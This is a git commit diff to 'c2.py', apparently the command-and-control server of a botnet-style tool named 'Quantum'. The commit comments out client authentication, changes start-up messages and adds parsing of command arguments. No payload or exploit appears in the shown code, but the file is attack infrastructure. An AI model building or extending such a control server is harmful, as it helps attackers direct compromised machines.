2beb0c6af03d70fbce336f9f24a6df979adfd835
n4no <74839733+Preauthorized@users.noreply.github.com>
2021-05-22 11:05:51 -0400

    Update c2.py

--- c2.py
+++ c2.py
@@ -9,7 +9,7 @@
 
 
 ## Modules
-import socket, sys, os, requests, time, threading, requests, random, select, datetime
+import socket, sys, os, requests, time, threading, requests, random, datetime
 
 ## Files
 from assets.Config.main import *
@@ -26,9 +26,14 @@ from assets.Commands.help import *
 from assets.Commands.methods import *
 from assets.Commands.geo import *
 
+if utils.CheckForPython3Unix() == True:
+        print("Thanks for using python3!")
+else:
+        print("Must use Python3!\r\nUsage: python3 " + sys.argv[0])
+
 
 buffer_length = 1024
-host = "127.0.0.1" # requests.get("https://api.ipify.org").text
+host = "127.0.0.1" #requests.get("https://api.ipify.org").text
 port = random.randint(0, 65500)
 timenow = datetime.datetime.now() # current time
 
@@ -37,52 +42,43 @@ sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port B
 sock.bind((host, port))
 sock.listen()
 
-print(f"Quantum Started | Port: {port}")
+print(f"Quantum Started | {host} | {port}")
 DiscordFunc.netStartUp(host, port, timenow)
 
 def handle_connection(client, addr):
         Current.CurrentInfo["IP"] = addr[0]
 
-        recData = client.recv(buffer_length).decode().split(":")
-        if len(recData) <= 1:
-                client.send("Failed to connect!".encode())
-                print(Strings.MainColors["Red"] + "Connection closed, by " + addr[0] + ":" + str(addr[1]) + ""+ Strings.MainColors["Reset"])
-                client.close()
-                return
-        username = recData[0]
-        password = recData[1]
+        # recData = client.recv(buffer_length).decode().split(":")
+        # print(len(recData))
+        # if len(recData) <= 1:
+        #         client.send("Failed to connect!".encode())
+        #         print(Strings.MainColors["Red"] + "Connection closed, by " + addr[0] + ":" + str(addr[1]) + ""+ Strings.MainColors["Reset"])
+        #         client.close()
+        #         return
+        # username = recData[0]
+        # password = recData[1]
         
-        client.send("1".encode())
+        # client.send("1".encode())
 
         while(True):
-                try:
-                        client.send(Strings.hostname("").encode())
-                        data = client.recv(buffer_length).decode()
+                client.send(Strings.hostname("").encode())
+                data = client.recv(buffer_length).decode()
 
-                        ## do not remove lines 62-67 (for testing purposes)
-                        # if data == r"\r\n":
-                        #         client.send(Strings.hostname("").encode("utf-8"))
-                        # elif data == r"b'\r\n'":
-                        #         client.send(Strings.hostname("").encode("utf-8"))
-                        # elif r'\r\n' in data:
-                        #         client.send(Strings.hostname("").encode("utf-8"))
-                        if data.lower() == "help":
-                                help_command(client)
-                                continue
-                        elif data.lower() == "geo":
-                                geo_command(client)
+                ## Command Handling
 
-                        # print(client.error)
+                Current.CurrentCmd["args"] = data.split(" ")
+                Current.CurrentCmd["fullcmd"] = data
 
-                        # if client.timeout:
-                        #         break
+                print(data)
+                print("Arguments: " + str(Current.CurrentCmd["args"]))
 
-                        if client.error:
-                                continue
-
-                except:
-                        break
-                
+                # do not remove lines 62-67 (for testing purposes)
+                if data.lower() == "help":
+                        help_command(client)
+                        continue
+                elif data.lower() == "geo":
+                        geo_command(client)
+        
 
 def listener():
     while True:
